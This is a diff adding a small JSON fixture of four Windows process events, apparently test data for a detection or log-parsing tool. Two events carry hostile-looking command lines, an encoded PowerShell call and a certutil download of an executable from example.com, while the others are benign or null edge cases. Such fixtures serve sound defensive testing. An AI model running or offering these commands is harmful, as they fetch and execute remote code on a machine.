@@ -1,0 +1,33 @@
+
+{
+  "events": [
+    {
+      "TimeCreated": "2026-11-17 10:00:00",
+      "ComputerName": "PC-01",
+      "UserName": "Admin",
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -enc SQBFAFgA"
+    },
+    {
+      "TimeCreated": "2026-11-17 10:02:00",
+      "ComputerName": "PC-02",
+      "UserName": "Pedro",
+      "Image": "C:\\Windows\\System32\\notepad.exe",
+      "CommandLine": "notepad.exe"
+    },
+    {
+      "TimeCreated": "2026-11-17 10:04:00",
+      "ComputerName": "PC-03",
+      "UserName": "Admin",
+      "Image": "C:\\Windows\\System32\\certutil.exe",
+      "CommandLine": "certutil.exe -urlcache -split -f https://example.com/file.exe"
+    },
+    {
+      "TimeCreated": "2026-11-17 10:06:00",
+      "ComputerName": "PC-04",
+      "UserName": null,
+      "Image": "C:\\Windows\\System32\\cmd.exe",
+      "CommandLine": null
+    }
+  ]
+}
